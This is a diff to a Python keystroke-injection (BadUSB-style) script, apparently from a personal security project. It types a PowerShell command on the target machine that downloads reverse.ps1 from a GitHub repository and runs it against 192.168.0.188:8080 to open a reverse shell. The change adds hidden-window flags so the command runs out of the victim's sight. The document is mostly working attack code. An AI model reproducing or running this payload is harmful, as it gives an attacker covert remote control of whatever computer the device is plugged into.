@@ -17,10 +17,8 @@ if __name__ == '__main__':
     HID.type_string(cmd)
     HID.press(bytes([*[0] * 2, CODE.ENTER, *[0] * 5]))
     time.sleep(0.2)
-    cmd = "Invoke-WebRequest -Uri https://raw.githubusercontent.com/thefishua/Something-Awesome/main/reverse.ps1 -Outfile .\\reverse.ps1;"
+    cmd = "powershell.exe -nologo -windowstyle hidden -command Invoke-WebRequest -Uri https://raw.githubusercontent.com/thefishua/Something-Awesome/main/reverse.ps1 -Outfile .\\reverse.ps1;"
     cmd += " .\\reverse.ps1 192.168.0.188 8080"
     HID.type_string(cmd)
     HID.press(bytes([*[0] * 2, CODE.ENTER, *[0] * 5]))
-    HID.press(bytes([CODE.LEFT_ALT, 0, CODE.SPACE, *[0] * 5]))
-    HID.press(bytes([*[0] * 2, CODE.KEY_N, *[0] * 5]))
 
